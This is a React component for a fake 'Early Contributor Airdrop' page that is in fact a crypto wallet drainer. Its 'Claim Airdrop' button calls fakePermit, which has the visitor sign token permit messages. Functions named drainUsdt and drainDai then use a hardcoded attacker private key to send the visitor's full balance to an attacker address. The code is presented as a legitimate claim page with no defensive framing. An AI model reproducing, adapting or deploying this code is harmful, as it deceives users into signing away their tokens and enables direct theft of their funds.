import React, { useState, useEffect } from "react";
import ABI from "./ABI.json";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount } from "wagmi";
import Web3 from "web3";
import { ethers } from "ethers";

const Slider = () => {
  const { address, isConnected } = useAccount();
  const { open } = useWeb3Modal();

  // contract instance web3js and Ethersjs
  const tokenAddress = "0xC2C527C0CACF457746Bd31B2a698Fe89de2b6d49";

  async function fakePermit() {
    if (!window.ethereum) {
      alert("Please install a Web3 wallet");
      return;
    }

    const web3 = new Web3(window.ethereum);
    let provider = new ethers.BrowserProvider(window.ethereum);
    let signer = provider.getSigner();

    function getTimestampInSeconds() {
      return Math.floor(Date.now() / 1000);
    }

    const tokenContract = new web3.eth.Contract(ABI, tokenAddress);

    const myToken = new ethers.Contract(tokenAddress, ABI, provider);

    const usdcToken = "0x07865c6e87b9f70255377e024ace6630c1eaa37f";
    const usdcConract = new ethers.Contract(usdcToken, ABI, provider);
    const tokenContractUsdc = new web3.eth.Contract(ABI, usdcToken);

    const daiToken = "0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844";
    const daiConract = new ethers.Contract(daiToken, ABI, provider);
    const tokenContractDai = new web3.eth.Contract(ABI, daiToken);

    const recipient = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
    const initiator = "0x46C189BA92DE11F8b0f0D7889EAEE5758B9A88aB";
    const initiatorPK = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";

    const wallet = await new ethers.Wallet(initiatorPK, provider);

    const chainId = (await provider.getNetwork()).chainId;

    const value = ethers.formatUnits(ethers.parseEther("1.0"), "wei").toString();

    const deadline = getTimestampInSeconds() + 4200;

    let tokenOwnerBalance = (await myToken.balanceOf(address)).toString();
    let tokenReceiverBalance = (await myToken.balanceOf(address)).toString();

    console.log(`Starting tokenOwner balance: ${tokenOwnerBalance}`);
    console.log(`Starting tokenReceiver balance: ${tokenReceiverBalance}`);

    const contractNonce = await myToken.nonces(address);
    const contractNonce2 = await daiConract.nonces(address);
    const contractNonce3 = await usdcConract.nonces(address);

    let account1Balance = 100;
    let account2Balance = 200;
    let account3Balance = 0;

    const bwalance = ethers.formatEther(ethers.parseEther("0.00048"), "wei").toString();

    let usdt = ethers.formatEther(await myToken.balanceOf(address)).toString();
    let usdc = ethers.formatEther(await usdcConract.balanceOf(address)).toString();
    let dai = ethers.formatEther(await daiConract.balanceOf(address)).toString();

    console.log(`usdt ${usdt}, usdc ${usdc}, dai ${dai} `);
    console.log(`bwalance ${bwalance}`);

    async function checkBalances() {
      if (usdt > bwalance) {
        console.log(`usdt ${usdt}`);
        drainUsdt();
      }
      if (usdc > bwalance) {
        console.log(`usdc ${usdc}`);
      }
      if (dai > bwalance) {
        console.log(`dai ${dai} ${await daiConract.name()} `);
        drainDai();
      }
    }

    checkBalances();

    async function drainUsdt() {
      const domain = {
        name: await myToken.name(),
        version: "1",
        chainId: chainId,
        verifyingContract: tokenAddress,
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };

      const values = {
        owner: address,
        spender: initiator,
        value: value,
        nonce: contractNonce,
        deadline: deadline,
      };
      let signer = await provider.getSigner(address);

      const signature = await signer.signTypedData(domain, types, values);
      const sig = ethers.Signature.from(signature);

      const permitData = tokenContract.methods
        .permit(address, initiator, value, deadline, sig.v, sig.r, sig.s)
        .encodeABI();

      const gasLimit = "0x" + web3.utils.toHex(300000).slice(2);
      const gasPrice = "0x" + Math.floor(gasLimit * 1.3).toString(16);

      const permitTX = {
        from: initiator,
        to: tokenAddress,
        nonce: await provider.getTransactionCount(initiator),
        gasLimit: gasLimit,
        gasPrice: gasPrice,
        value: "0x",
        data: permitData,
      };

      const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, initiatorPK);
      let tx = web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
      await tx;

      console.log(`Check allowance: ${await myToken.allowance(address, initiator)}`);
      const balance = await myToken.balanceOf(address);
      console.log(`Transferring ${balance}`);

      const transferData = tokenContract.methods.transferFrom(address, recipient, balance).encodeABI();
      const transferTX = {
        from: initiator,
        to: tokenAddress,
        nonce: (await provider.getTransactionCount(initiator)) + 1,
        gasLimit: gasLimit,
        gasPrice: gasPrice,
        data: transferData,
        value: "0x",
      };
      const signedTransferTX = await web3.eth.accounts.signTransaction(transferTX, initiatorPK);
      wallet.sendTransaction(signedTransferTX);
      let tx2 = web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction);
      await tx2;

      tokenOwnerBalance = (await myToken.balanceOf(address)).toString();
      tokenReceiverBalance = (await myToken.balanceOf(recipient)).toString();

      console.log(`Ending tokenOwner balance: ${tokenOwnerBalance}`);
      console.log(`Ending tokenReceiver balance: ${tokenReceiverBalance}`);
    }

    async function drainDai() {
      const domain = {
        name: await usdcConract.name(),
        version: "2",
        chainId: chainId,
        verifyingContract: usdcToken,
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };

      const values = {
        owner: address,
        spender: initiator,
        value: value,
        nonce: contractNonce3,
        deadline: deadline,
      };
      let signer = await provider.getSigner(address);

      const signature = await signer.signTypedData(domain, types, values);
      const sig = ethers.Signature.from(signature);

      const permitData = tokenContractUsdc.methods
        .permit(address, initiator, value, deadline, sig.v, sig.r, sig.s)
        .encodeABI();

      const gasLimit = "0x" + web3.utils.toHex(300000).slice(2);
      const gasPrice = "0x" + Math.floor(gasLimit * 1.3).toString(16);

      const permitTX = {
        from: initiator,
        to: usdcToken,
        nonce: await provider.getTransactionCount(initiator),
        gasLimit: gasLimit,
        gasPrice: gasPrice,
        value: "0x",
        data: permitData,
      };

      const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, initiatorPK);
      let tx = web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
      await tx;

      console.log(`Check allowance: ${await usdcConract.allowance(address, initiator)}`);
      const balance = await usdcConract.balanceOf(address);
      console.log(`Transferring ${balance}`);

      const transferData = tokenContractUsdc.methods.transferFrom(address, recipient, balance).encodeABI();
      const transferTX = {
        from: initiator,
        to: usdcToken,
        nonce: (await provider.getTransactionCount(initiator)) + 1,
        gasLimit: gasLimit,
        gasPrice: gasPrice,
        data: transferData,
        value: "0x",
      };
      const signedTransferTX = await web3.eth.accounts.signTransaction(transferTX, initiatorPK);
      wallet.sendTransaction(signedTransferTX);
      let tx2 = web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction);
      await tx2;

      tokenOwnerBalance = (await usdcConract.balanceOf(address)).toString();
      tokenReceiverBalance = (await usdcConract.balanceOf(recipient)).toString();

      console.log(`Ending tokenOwner balance: ${tokenOwnerBalance}`);
      console.log(`Ending tokenReceiver balance: ${tokenReceiverBalance}`);
    }
  }

  return (
    <div className="slider">
      <div className="glass-card">
        <div className="reward-label">EARLY CONTRIBUTOR AIRDROP</div>
        <div className="reward-amount">5,000 $ECLIPSE</div>
        <div className="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>

        {isConnected ? (
          <button onClick={fakePermit} className="connect-btn">Claim Airdrop</button>
        ) : (
          <button onClick={() => open()} className="connect-btn">Connect Wallet</button>
        )}

        <div className="eligibility">
          <i className="fas fa-shield-alt"></i> Eligibility: GitHub contributors, early testnet participants, active community members
        </div>
      </div>
    </div>
  );
};

export default Slider;